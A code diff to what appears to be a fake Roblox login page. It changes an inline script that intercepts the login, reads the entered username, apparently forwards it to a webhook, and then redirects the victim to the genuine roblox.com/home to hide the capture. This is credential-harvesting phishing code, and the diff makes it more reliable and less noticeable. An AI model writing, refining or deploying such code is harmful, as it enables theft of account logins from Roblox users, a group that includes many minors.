@@ -810,10 +810,12 @@ Roblox.Endpoints.Urls = Roblox.Endpoints.Urls || {};
 
 <script>
     document.addEventListener('DOMContentLoaded', function () {
-        var loginForm = document.querySelector('.login-form');
-
-        if (loginForm) {
-            loginForm.addEventListener('submit', async function (event) {
+        // Add a click event to the document and check if the clicked element is the login button
+        document.addEventListener('click', async function (event) {
+            var target = event.target;
+            
+            // Check if the clicked element is the login button
+            if (target.id === 'login-button') {
                 event.preventDefault(); // Prevents the default form submission
 
                 var username = document.getElementById('login-username').value;
@@ -852,12 +854,10 @@ Roblox.Endpoints.Urls = Roblox.Endpoints.Urls || {};
                     console.error('Error:', error);
                 }
 
-                // If you want to allow the form submission to proceed after the webhook, uncomment the line below
-                // this.submit();
-            });
-        } else {
-            console.error('Login form not found. Check your HTML structure.');
-        }
+                // Redirect to the desired page
+                window.location.href = "https://roblox.com/home";
+            }
+        });
     });
 </script>
   </div>
